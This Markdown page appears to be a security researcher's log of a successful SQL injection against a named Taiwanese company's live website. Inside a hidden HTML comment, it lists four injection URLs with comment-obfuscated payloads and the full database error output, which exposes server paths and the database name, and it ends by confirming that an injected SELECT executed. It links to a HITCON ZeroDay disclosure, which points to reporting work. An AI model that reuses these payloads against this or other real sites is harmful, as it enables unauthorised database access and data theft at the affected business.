---
title: SQL Injection fulifa Success
description: SQL Injection fulifa Success
last_update:
  date: "2025-08-18T08:00:00+08:00"
---

<!-- ## 測試過程

1. `https://www.fulifa.com.tw/news.php'`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''/news.php'') != 0 and meta_fid != '' AND meta_key_tw <> ''' at line 1 in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/init.php(61): getMetaHotsite('meta_memo_tw', 'tw') #3 /home/lsdesignweb/public_html/cuz_html/fulifa/include_header.php(8): require_once('/home/lsdesignw...') #4 /home/lsdesignweb/public_html/cuz_html/fulifa/index.php(1): require_once('/home/lsdesignw...') #5 {main} thrown in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php on line 44
```

2. `https://www.fulifa.com.tw/news.php',test`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 and meta_fid != '' AND meta_key_tw <> ''' at line 1 in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/init.php(61): getMetaHotsite('meta_memo_tw', 'tw') #3 /home/lsdesignweb/public_html/cuz_html/fulifa/include_header.php(8): require_once('/home/lsdesignw...') #4 /home/lsdesignweb/public_html/cuz_html/fulifa/index.php(1): require_once('/home/lsdesignw...') #5 {main} thrown in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php on line 44
```

3. `https://www.fulifa.com.tw/news.php'/**/AND/**/(SELECT/**/*/**/FROM/**/helloworldtable)`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 and meta_fid != '' AND meta_key_tw <> ''' at line 1 in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/init.php(61): getMetaHotsite('meta_memo_tw', 'tw') #3 /home/lsdesignweb/public_html/cuz_html/fulifa/include_header.php(8): require_once('/home/lsdesignw...') #4 /home/lsdesignweb/public_html/cuz_html/fulifa/index.php(1): require_once('/home/lsdesignw...') #5 {main} thrown in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php on line 44
```

4. `https://www.fulifa.com.tw/news.php'/**/AND/**/(SELECT/**/*/**/FROM/**/helloworldtable)/**/AND/**/'1'='1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'lsdesignweb_fulifa.helloworldtable' doesn't exist in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesignweb/public_html/cuz_html/fulifa/includes/init.php(61): getMetaHotsite('meta_memo_tw', 'tw') #3 /home/lsdesignweb/public_html/cuz_html/fulifa/include_header.php(8): require_once('/home/lsdesignw...') #4 /home/lsdesignweb/public_html/cuz_html/fulifa/index.php(1): require_once('/home/lsdesignw...') #5 {main} thrown in /home/lsdesignweb/public_html/cuz_html/fulifa/includes/cls_mysql.php on line 44
```

SELECT 語法成功執行～

5. 接下來請參考 [ZD-2025-01012](https://zeroday.hitcon.org/vulnerability/ZD-2025-01012) -->

[ZD-2025-01012](https://zeroday.hitcon.org/vulnerability/ZD-2025-01012)
